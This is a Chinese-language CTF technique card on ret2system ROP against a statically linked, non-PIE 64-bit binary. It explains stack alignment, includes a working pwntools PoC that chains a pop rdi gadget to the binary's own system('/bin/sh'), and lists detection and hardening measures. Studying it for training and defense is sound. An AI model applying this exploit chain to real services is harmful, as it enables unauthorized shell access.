---
id: binary-pwn-rop-static-link-ret2system-sh
title: 静态链接无 PIE 栈溢出：用二进制内置 system 与 /bin/sh 直接 ROP
type: scenario
domain: binary
path: binary/pwn/rop
technique: static-link-ret2system
aliases:
- 静态链接 ret2system
- 静态 ELF 内置 system
- 无需 libc 泄露的 ROP
- pop rdi ; pop rbp ; ret
- 静态链接 ROP 栈对齐
tags:
- pwn
- stack-overflow
- rop
- static-link
- no-pie
- nx
- gadget
- alignment
- linux
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V98
  verified_at: '2026-11-05T19:57:57+08:00'
  notes: 已对照原文与图01-03核对：checksec(ret2text1) 为 Partial RELRO/NX/No PIE/2157 symbols（图02），静态链接、system=0x405210、/bin/sh=0x488599、pop rdi;pop rbp;ret=0x402348、offset=264 与原文脚本一致；图03 实机 cat flag 成功。对齐推导正确：vuln 帧 rbp 16 对齐，ret 后 RSP≡0，gadget 弹 2 qword+ret 弹 1 qword 后 system 入口 RSP≡8。rsync uid1000 vs /flag root:root 0400 的干扰项分析也与原文一致。未验证点：PoC 未在本机复跑，地址仅对应原题样本；frontmatter 无 sources/source_url（全库惯例）。
---

## 一句话结论

对静态链接、关闭 PIE 的 64 位程序，栈溢出后不需要泄露 libc：`system`、`/bin/sh` 与所需 gadget 都已在可执行文件内有固定地址，用一条 `pop rdi; pop rbp; ret` + `system("/bin/sh")` 的短 ROP 链即可拿 shell；同时要按 8 字节步进核算进入 `system` 时的 RSP 对齐。

## 原理

- 静态链接把 glibc 的目标代码和字符串直接链接进 ELF，符号表也可能保留（本例可看到上千个符号）。因此 `system` 有确定的文件内地址，`strings`/`readelf -s` 能找到 `/bin/sh` 与 `system`，不依赖运行时 libc 基址。
- 关闭 PIE 后代码段固定加载在 `0x400000` 一类地址，ASLR 不会改变这些地址，返回地址可以硬编码；NX 只禁止执行栈上的数据，不阻止复用可执行段中的 gadget。
- x86-64 System V ABI 要求控制转移到函数入口时 `RSP + 8` 为 16 的倍数，即 `RSP % 16 == 8`（等价于 `call` 前 `RSP % 16 == 0`）。ROP 链中每个 `pop` 或 `ret` 消耗 8 字节，都会翻转一次对齐奇偶；需按溢出函数的帧布局算清进入 `system` 的那一刻。
- 本例的 `pop rdi; pop rbp; ret` 连续弹出两个 qword，共 16 字节：进入 gadget 时若 `RSP % 16 == 0`，执行 `pop rdi` 后为 8、`pop rbp` 后为 0、`ret` 弹出 `system` 地址后为 8，正好满足 `system` 入口所需的 `RSP % 16 == 8`，因此不需要额外插入 `ret`。若换成只弹一个寄存器的 `pop rdi; ret`，奇偶会不同，可能需要额外一个 `ret` 调整。
- 题目的 `win()` 只是执行 `/challenge/start.sh` 启动 rsync 后退出，并非 shell；rsync 以 uid/gid 1000 运行，而 `/flag` 是 root:root 0400，即使 `use chroot = no` 做路径穿越，内核也会因权限不足拒绝读取。第一阶段 PWN 进程本身权限更高，所以正确路线是直接在第一次溢出时 ROP 到 shell，而不是去打通 rsync 第二阶段。

## 触发条件

- 64 位 ELF，栈缓冲区可溢出且能覆盖保存的返回地址。
- 二进制为静态链接（或至少 `system`/`/bin/sh` 已在文件内），且未开启 PIE（或已泄露代码基址）。
- NX 开启也无妨：利用的是可执行段中的现有代码与字符串，不需要执行栈上 shellcode。
- 存在 `pop rdi; ...; ret` 一类能把 `"/bin/sh"` 地址放入 RDI 的 gadget，且 `system` 可达。

## 利用步骤

1. `checksec` 确认静态链接、No PIE、NX；`file`/`readelf -h` 复核架构与链接方式。
2. 反编译定位溢出点：本例为 `char buf[256]` 上的 `read(0, buf, 512)`；到保存 RBP 为 256 字节，再加 8 字节保存 RBP，共 264 字节到返回地址。
3. 在二进制内找符号与字符串：`readelf -sW ./bin | grep -w system` 得 `system` 地址，`strings -t x ./bin | grep '/bin/sh'` 得字符串地址；用 ROPgadget/ropper 找 `pop rdi; pop rbp; ret`。
4. 计算对齐：确认进入 gadget 时的 `RSP % 16`，按每个 pop 8 字节推导 `system` 入口是否满足 `RSP % 16 == 8`；不满足就在链首加 `ret` 或换 gadget。
5. 发送 `padding + p64(gadget) + p64(bin_sh) + p64(0) + p64(system)`，拿 shell 后读 flag。
6. 若题目另有 rsync/ftp 等第二阶段，先核对权限链（守护进程 uid 与目标文件属主/权限、chroot 配置），确认第二阶段是否真的可达，避免被干扰项拖住。

## PoC

```python
from pwn import *

context.arch = "amd64"
context.os = "linux"

elf = ELF("./ret2text1")
pop_rdi_rbp = 0x402348      # pop rdi ; pop rbp ; ret
system_addr = 0x405210      # 静态链接进二进制的 system
bin_sh      = 0x488599      # 二进制内的 "/bin/sh"

p = remote(host, port)
p.recvuntil(b"Enter your access phrase:\n")

payload  = b"A" * 264              # 256 字节缓冲区 + 8 字节保存 RBP
payload += p64(pop_rdi_rbp)
payload += p64(bin_sh)
payload += p64(0)                  # 被 pop rbp 消费，同时补齐对齐
payload += p64(system_addr)
p.sendline(payload)
p.interactive()
```

```text
偏移推导：buf[256] + saved rbp[8] = 264 (0x108)
地址因二进制而异，必须用当前样本的符号/字符串重新确认
```

## 变体与关联

- 变体：若二进制没有 `pop rdi`，可转向 ret2csu、`pop rsi; ...` 组合、SROP，或寻找自定义 thunk（如 `mov rsp, rdi; jmp *reg`）。
- 变体：静态链接但开启 PIE（`-static-pie`）时地址随机化仍生效，需要先泄露代码基址；静态链接并不等于可忽略 ASLR。
- 变体：若只能跳到 `win()` 这类“启动服务”函数，需继续审计第二阶段的权限链；本例的 rsync 第二阶段因 uid 1000 对 0400 root 文件无读权限而不可行。
- 关联：[[binary-pwn-stack-ret2libc]]（动态链接下先泄 libc 再 ret2libc 的通用路线）、[[binary-pwn-rop-mov-rsp-rdi-jmp-r13-system]]（无 `pop rdi` 时借自定义函数传参）、[[binary-pwn-stack-ret2text-win-plus-one-align]]（后门函数 ret2text 的对齐修正）。
- 边界：静态链接二进制体积大、gadget 多，但不同编译器/优化级别会改变 gadget 与字符串地址；卡内地址只对应原题样本。

## 检测与防御

- 检测：崩溃转储中 RIP 落在代码段的 gadget 序列、栈上出现连续代码地址与 `/bin/sh` 指针；进程异常派生出 `sh`/`bash`；对静态链接服务重点审计 `read`/`gets` 等无界输入。
- 修复：用 `-fstack-protector-strong`、`-fPIE -pie`、Full RELRO 重新编译；保留 NX；对交互式输入做长度校验；不要静态链接含 `system` 的 libc 后仍以高权限运行。
- 加固：服务进程降权并启用 seccomp 限制 `execve`；部署 ASLR/CET；静态场景可考虑 `-static-pie` 与符号裁剪；监控高权限进程的 shell 派生。
